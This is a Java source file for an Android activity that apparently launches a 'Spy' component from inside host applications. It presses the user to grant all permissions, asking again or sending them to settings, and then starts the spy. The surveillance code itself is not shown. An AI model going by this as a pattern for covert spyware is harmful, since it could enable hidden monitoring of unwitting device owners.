package com.gameofcoding.spy.activities;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import com.gameofcoding.spy.R;
import com.gameofcoding.spy.spys.SpyStarter;
import com.gameofcoding.spy.utils.AppConstants;
import com.gameofcoding.spy.utils.Utils;
import com.gameofcoding.spy.utils.XLog;

/**
 * This activity is started by host applications in order to start Spy.
 */
public class SpyStarterActivity extends Activity {
    private static final String TAG = "SpyStarterActivity";
    private static final int PERMISSIONS_REQUEST_CODE = 101;
    private static final int OPEN_SETTINGS_REQUEST_CODE = 102;
    private Utils mUtils = new Utils(this);

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_spystarter);
	XLog.i(TAG, "onCreate(Bundle): Starting spy.");
	startSpy();
    }

    /**
     * Starts spy.
     */
    private void startSpy() {
   	if(mUtils.hasPermissions()) {
	    new SpyStarter(this).start();
	    setResult(RESULT_OK);
	    finish();
	} else {
	    XLog.d(TAG, "All permissions are not granted, prompting for permission grant...");
	    grantPermissions();
	}
    }

    /**
     * Prompts user for granting all permissions.
     */
    private boolean grantPermissions() {
	if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
	    if(!mUtils.hasPermissions()) {
		requestPermissions(AppConstants.PERMISSIONS_NEEDED,
				   PERMISSIONS_REQUEST_CODE);
		return false;
	    }
	}

	// All permission granted
	return true;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
	super.onRequestPermissionsResult(requestCode, permissions, grantResults);
	switch(requestCode) {
	case PERMISSIONS_REQUEST_CODE:
	    handlePermissionResult();
	    break;
	}
    }

    /**
     * Checks whether the user has granted all permissions or not. If the user had granted all
     * permissions then it starts spy otherwise it again prompts for granting  permissions.
     */
    private void handlePermissionResult() {
       	if(Build.VERSION.SDK_INT < Build.VERSION_CODES.M)
	    return;
	for(String permission : AppConstants.PERMISSIONS_NEEDED) {
	    if(mUtils.hasPermission(permission)) {
		// User granted this permission, check for next one
		continue;
	    }
	    // User not granted permission
	    AlertDialog.Builder permissionRequestDialog = new AlertDialog.Builder(this)
		.setTitle(R.string.dialog_permission_title)
		.setMessage(R.string.dialog_permission_message)
		.setCancelable(false)
		.setNegativeButton(R.string.exit,
				   new DialogInterface.OnClickListener() {
				       @Override
				       public void onClick(DialogInterface dialog, int whichButton) {
					   mUtils.showToast(R.string.closing_app);
					   setResult(RESULT_CANCELED);
					   finish();
				       }
				   });
	    if(!shouldShowRequestPermissionRationale(permission)) {
		// User clicked on "Don't ask again", show dialog to navigate him to
		// settings
		permissionRequestDialog
		    .setPositiveButton(R.string.go_to_settings,
				       new DialogInterface.OnClickListener() {
					   @Override
					   public void onClick(DialogInterface dialog,
							       int whichButton) {
					       Intent intent =
						   new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
					       Uri uri =
						   Uri.fromParts("package", getPackageName(), null);
					       intent.setData(uri);
					       startActivityForResult(intent,
								      OPEN_SETTINGS_REQUEST_CODE);
					   }
				       })
		    .show();
	    } else {
		// User clikced on 'deny', prompt again for permissions
		permissionRequestDialog
		    .setPositiveButton(R.string.try_again,
				       new DialogInterface.OnClickListener() {
					   @Override
					   public void onClick(DialogInterface dialog,
							       int whichButton) {
					       grantPermissions();
					   }
				       })
		    .show();
	    }
	    return;
	}
	// All permissions granted start spystarteractivity
	XLog.i(TAG, "All required permissions have been granted!");
	startSpy();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
	super.onActivityResult(requestCode, resultCode, data);
	switch(requestCode) {
	case OPEN_SETTINGS_REQUEST_CODE:
	    handlePermissionResult();
	    break;
	}
    }
}
